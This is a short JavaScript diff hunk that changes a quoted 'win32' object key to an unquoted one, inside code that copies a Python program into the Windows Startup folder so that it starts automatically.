@@ -36,7 +36,7 @@ const waysOfFlushConfigToTheSelfStartPythonProgramFolder = {
 
 //how to set the python program as self starts
 const waysOfSetPythonProgramAsSelfStarts = {
-  'win32': () => {
+  win32: () => {
     const pathOfSelfStarts = 'C:\\Users\\' + currentUsername + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\bsd.pyw'
     const pythonPath = waysOfGetThePathOfThePythonProgram[platform]
     fs.copyFileSync(pythonPath, pathOfSelfStarts)
